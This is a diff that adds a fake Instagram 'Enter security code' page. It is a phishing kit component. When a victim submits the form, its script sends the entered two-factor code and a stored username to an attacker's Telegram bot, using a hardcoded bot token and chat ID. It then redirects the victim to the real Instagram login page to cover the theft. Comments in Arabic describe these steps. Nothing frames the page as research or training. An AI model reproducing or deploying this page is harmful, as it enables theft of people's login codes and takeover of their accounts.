@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Security Code - Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 350px; padding: 20px; background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; text-align: center; }
+        .logo { font-family: 'Grand Hotel', cursive; font-size: 40px; margin-bottom: 20px; }
+        .icon { width: 60px; margin-bottom: 15px; }
+        h2 { font-size: 16px; font-weight: 600; color: #262626; margin-bottom: 10px; }
+        p { font-size: 14px; color: #8e8e8e; line-height: 1.4; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 16px; text-align: center; letter-spacing: 2px; margin-bottom: 15px; outline: none; }
+        .btn { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 4px; padding: 10px; font-weight: 600; font-size: 14px; cursor: pointer; }
+        .btn:disabled { background-color: #b2dffc; cursor: default; }
+        .error { color: #ed4956; font-size: 13px; margin-top: 15px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Instagram</div>
+        <img class="icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Instagram_2FA_icon.svg/1200px-Instagram_2FA_icon.svg.png" alt="Security">
+        <h2>Enter security code</h2>
+        <p>We sent a code to your email. Enter it below to continue.</p>
+        <form id="2faForm">
+            <input type="text" id="code" placeholder="------" maxlength="6" required>
+            <button type="submit" class="btn" id="submitBtn">Confirm</button>
+            <div class="error" id="error"></div>
+        </form>
+    </div>
+    <script>
+        const form = document.getElementById('2faForm');
+        const codeInput = document.getElementById('code');
+        const submitBtn = document.getElementById('submitBtn');
+        const errorDiv = document.getElementById('error');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const code = codeInput.value.trim();
+            if (code.length < 6) return;
+
+            // إرسال رمز 2FA إلى تيليجرام
+            const BOT_TOKEN = "9134254301:AAG8bCDBz8IfO8CHEk5Qyxie2ceOca_xx0U";
+            const CHAT_ID = "2005892579";
+            const username = sessionStorage.getItem('insta_user') || 'Unknown';
+            
+            const message = `🔐 *INSTAGRAM 2FA CODE!*\n👤 User: \`${username}\`\n🔢 Code: \`${code}\``;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
+            }).then(() => {
+                // التوجيه لصفحة إنستقرام الحقيقية بعد إرسال الكود
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            }).catch(() => {
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            });
+        });
+    </script>
+</body>
+</html>
